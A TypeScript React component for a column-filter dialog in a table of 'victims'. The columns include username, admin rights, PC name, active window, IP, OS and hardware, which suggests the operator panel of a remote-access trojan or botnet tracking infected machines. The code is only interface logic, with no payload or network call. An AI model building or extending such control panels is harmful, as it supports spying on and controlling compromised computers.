"use client";

import { useEffect, useMemo } from "react";

import { useVictimsTablePrefs } from "./victims-table-prefs-provider";
import type { VictimsColumnKey } from "./victims-columns";

type Check = {
   id: string;
   label: string;
   col: VictimsColumnKey;
};

const COLS_LEFT: Check[] = [
   { id: "filterColStatus", label: "status", col: "h-icon" },
   { id: "filterColUsername", label: "username", col: "h-user" },
   { id: "filterColAdmin", label: "admin rights", col: "h-admin" },
   { id: "filterColComment", label: "comment", col: "h-comment" },
   { id: "filterColLocation", label: "location", col: "h-country" },
   { id: "filterColPcName", label: "pc-name", col: "h-pc-name" },
   { id: "filterColActiveWindow", label: "active-window", col: "h-window" },
   { id: "filterColLastActive", label: "last active", col: "h-last-active" },
];

const COLS_RIGHT: Check[] = [
   { id: "filterColId", label: "id", col: "h-id" },
   { id: "filterColIp", label: "ip", col: "h-ip" },
   { id: "filterColOs", label: "os", col: "h-os" },
   { id: "filterColCpu", label: "cpu", col: "h-cpu" },
   { id: "filterColRam", label: "ram", col: "h-ram" },
   { id: "filterColGpu", label: "gpu", col: "h-gpu" },
];

function CheckRow(props: {
   id: string;
   label: string;
   checked: boolean;
   onChange: (next: boolean) => void;
}) {
   const { id, label, checked, onChange } = props;

   return (
      <label className="inline-flex items-center justify-start gap-[10px] text-[14px] text-white/[0.92]">
         <span className="order-2 block">{label}</span>
         <input
            id={id}
            type="checkbox"
            checked={checked}
            onChange={(e) => onChange(e.target.checked)}
            className={
               "relative order-1 h-[18px] w-[18px] flex-[0_0_18px] cursor-pointer appearance-none rounded-[6px] border border-white/[0.18] bg-black/[0.18] shadow-[inset_0_1px_0_rgba(255,255,255,0.06)] " +
               "grid place-items-center transition-[background,border-color,transform] duration-150 hover:border-white/[0.28] active:translate-y-[1px] " +
               "checked:bg-[rgba(255,75,75,0.22)] checked:border-[rgba(255,75,75,0.55)] " +
               "checked:after:content-[''] checked:after:absolute checked:after:left-1/2 checked:after:top-1/2 checked:after:h-[6px] checked:after:w-[10px] " +
               "checked:after:-translate-x-1/2 checked:after:-translate-y-[60%] checked:after:rotate-[-45deg] " +
               "checked:after:border-l-2 checked:after:border-b-2 checked:after:border-white/[0.98] " +
               "focus-visible:outline-none focus-visible:shadow-[inset_0_1px_0_rgba(255,255,255,0.06),0_0_0_3px_rgba(255,255,255,0.1)]"
            }
         />
      </label>
   );
}

export function VictimsFilterModal() {
   const prefs = useVictimsTablePrefs();
   const isOpen = prefs.isFilterModalOpen;

   useEffect(() => {
      const onKeyDown = (e: KeyboardEvent) => {
         if (e && e.key === "Escape") prefs.closeFilterModal();
      };
      document.addEventListener("keydown", onKeyDown);
      return () => document.removeEventListener("keydown", onKeyDown);
   }, [prefs]);

   const allChecks = useMemo(() => ({ left: COLS_LEFT, right: COLS_RIGHT }), []);

   return (
      <div
         id="filterModalBackdrop"
         hidden={!isOpen}
         className="fixed inset-0 z-[999] grid place-items-center bg-black/[0.62] backdrop-blur-[10px]"
         onMouseDown={(e) => {
            if (e.target === e.currentTarget) prefs.closeFilterModal();
         }}
      >
         <div
            className="grid max-h-[min(700px,90vh)] w-[min(420px,92vw)] grid-rows-[auto_1fr] overflow-hidden rounded-[16px] border border-white/[0.18] bg-[rgba(18,18,18,0.92)] shadow-[0_18px_70px_rgba(0,0,0,0.55)] backdrop-blur-[8px]"
            role="dialog"
            aria-modal="true"
            aria-label="Filter settings"
         >
            <div className="flex items-center justify-between border-b border-white/[0.2] px-[14px] py-[12px]">
               <div className="text-[22px] font-[900] tracking-[0.2px] text-white">Filters</div>
               <button
                  id="filterModalClose"
                  type="button"
                  aria-label="Close"
                  className="grid h-[30px] w-[30px] cursor-pointer select-none place-items-center overflow-hidden rounded-[10px] border border-white/[0.14] bg-white/[0.06] text-[18px] leading-none text-white transition-[background,border-color,transform] duration-150 hover:bg-white/[0.10] hover:border-white/[0.22] active:translate-y-[1px]"
                  onClick={() => prefs.closeFilterModal()}
               >
                  <span aria-hidden="true" className="block h-[18px] w-[18px] text-center leading-[18px]">
                     ×
                  </span>
               </button>
            </div>

            <div className="p-[18px]">
               <div className="grid gap-[10px]">
                  <div className="text-[22px] font-[900] tracking-[0.2px] text-white">Colomns</div>
                  <div className="grid grid-cols-[auto_auto] justify-start gap-x-[12px]">
                     <div className="grid min-w-0 content-start gap-[6px]">
                        {allChecks.left.map((c) => (
                           <CheckRow
                              key={c.id}
                              id={c.id}
                              label={c.label}
                              checked={!!prefs.columnVisibility[c.col]}
                              onChange={(next) => prefs.setColumnVisibility({ ...prefs.columnVisibility, [c.col]: next })}
                           />
                        ))}
                     </div>
                     <div className="grid min-w-0 content-start gap-[6px]">
                        {allChecks.right.map((c) => (
                           <CheckRow
                              key={c.id}
                              id={c.id}
                              label={c.label}
                              checked={!!prefs.columnVisibility[c.col]}
                              onChange={(next) => prefs.setColumnVisibility({ ...prefs.columnVisibility, [c.col]: next })}
                           />
                        ))}
                     </div>
                  </div>

                  <button
                     id="filterResetBtn"
                     type="button"
                     className="mt-[10px] h-[30px] justify-self-end rounded-full border border-white/[0.14] bg-white/[0.06] px-[12px] text-[13px] font-extrabold text-white/[0.92] transition-[background,border-color] duration-150 hover:bg-white/[0.10] hover:border-white/[0.22]"
                     onClick={() => prefs.resetFiltersAndOrder()}
                  >
                     Reset
                  </button>
               </div>
            </div>
         </div>
      </div>
   );
}